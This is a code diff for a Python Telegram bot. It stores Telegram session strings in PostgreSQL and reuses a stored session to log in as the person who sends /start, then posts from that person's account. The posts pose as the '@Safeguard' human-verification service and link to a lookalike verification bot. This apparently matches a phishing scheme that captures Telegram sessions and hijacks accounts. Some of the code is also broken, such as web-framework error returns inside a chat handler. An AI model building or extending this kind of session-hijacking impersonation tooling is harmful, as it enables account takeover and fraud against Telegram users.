@@ -1,16 +1,83 @@
 import asyncio
 import httpx
 import requests
+from telethon.sessions import StringSession
 from telethon import TelegramClient, events
 from telethon.tl.custom import Button
 import aiohttp  # Asynchronous HTTP requests
 from dotenv import load_dotenv
+from quart import Quart, request, jsonify
 import os
+import psycopg2
+from psycopg2 import sql
 from aiohttp import web  # For the HTTP server
 from io import BytesIO
 
 # Load environment variables from the .env file
 load_dotenv()
+
+# Database Setup
+# Use Render's environment variables for database connection details
+DB_HOST = os.getenv("DB_HOST")
+DB_NAME = os.getenv("DB_NAME")
+DB_USER = os.getenv("DB_USER")
+DB_PASSWORD = os.getenv("DB_PASSWORD")
+DB_PORT = os.getenv("DB_PORT", "5432")
+
+# Connect to PostgreSQL
+try:
+    db_conn = psycopg2.connect(
+        host=DB_HOST,
+        database=DB_NAME,
+        user=DB_USER,
+        password=DB_PASSWORD,
+        port=DB_PORT
+    )
+    db_cursor = db_conn.cursor()
+    print("Connected to PostgreSQL database successfully.")
+except Exception as e:
+    print(f"Error connecting to PostgreSQL: {e}")
+    exit()
+
+# create tables
+# Create a table to store the bot's session
+db_cursor.execute("""
+    CREATE TABLE IF NOT EXISTS bot_sessions (
+        id SERIAL PRIMARY KEY,
+        session_data TEXT NOT NULL
+    )
+""")
+db_conn.commit()
+
+
+
+# Helper Functions
+def save_bot_session(session_string):
+    query = """
+        INSERT INTO bot_sessions (id, session_data)
+        VALUES (1, %s)
+        ON CONFLICT (id) DO UPDATE
+        SET session_data = EXCLUDED.session_data;
+    """
+    db_cursor.execute(query, (session_string,))
+    db_conn.commit()
+    print("Bot session saved successfully.")
+
+
+def get_bot_session():
+    query = "SELECT session_data FROM bot_sessions WHERE id = 1;"
+    db_cursor.execute(query)
+    result = db_cursor.fetchone()
+    return result[0] if result else None
+
+
+def get_session_from_db(chat_id):
+    query = "SELECT session_data FROM telegram_sessions WHERE chat_id = %s;"
+    db_cursor.execute(query, (chat_id,))
+    result = db_cursor.fetchone()
+    if result:
+        print(f"Session for chat_id {chat_id} retrieved successfully.")
+    return result[0] if result else None
 
 # Access the environment variables
 api_id = os.getenv('API_ID')
@@ -94,10 +161,25 @@ async def on_verify_button_click(event):
 
 @portal_bot_client.on(events.NewMessage(pattern='/start'))
 async def on_portal_access(event):
+    chat_id = event.chat_id
     try:
         # Define your channel ID
         channel_id = '-1002486862799'  # Replace with your actual channel ID
         image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-investment-blog.appspot.com/o/bot_pics%2FScreenshot_20241224_133800_Telegram.jpg?alt=media&token=48ff61f7-8475-4145-a6f0-8d3861b20146'
+
+                # Reuse the existing session if available
+        # Try to retrieve the session from the database
+        session_string = get_session_from_db(chat_id)
+        session = StringSession(session_string) if session_string else StringSession()
+        if not session:
+            return jsonify({'error': 'No session found for this user'}), 404
+
+        user_client = TelegramClient(session, api_id, api_hash)
+        await user_client.connect()
+
+        if not await user_client.is_user_authorized():
+            return jsonify({'error': 'User not authorized. Please authenticate first.'}), 403
+
 
         # Download the image from the URL
         async with aiohttp.ClientSession() as session:
@@ -108,17 +190,17 @@ async def on_portal_access(event):
                     image_data.name = 'image_verify_portal.jpg'  # Set a name for the file
 
                     # Upload the photo and send the message to the channel
-                    uploaded_photo = await portal_bot_client.upload_file(image_data)
+                    uploaded_photo = await user_client.upload_file(image_data)
 
-                    # Send the message with the image and buttons using send_message
-                    message = await portal_bot_client.send_message(
-                        channel_id,  # Send to the channel using the channel ID
-                        message=(
+                    # Send the message to the channel using channel ID
+                    message = await user_client.send_message(
+                        channel_id,  # Using the channel ID to send the message
+                        message=(  # Message content
                             "$MINTERPRO | PORTAL is being protected by @Safeguard\n\n"
                             "Click below to verify you're human"
                         ),
-                        file=uploaded_photo,
-                        buttons=[
+                        file=uploaded_photo,  # Attach the uploaded photo
+                        buttons=[  # Add buttons
                             [Button.url("Tap to verify", "https://t.me/verification_by_safeguard_bot")]
                         ]
                     )
@@ -127,6 +209,7 @@ async def on_portal_access(event):
                     print(f"Failed to fetch the image. HTTP Status: {response.status}")
     except Exception as e:
         print(f"Error: {e}")
+
 
 
 
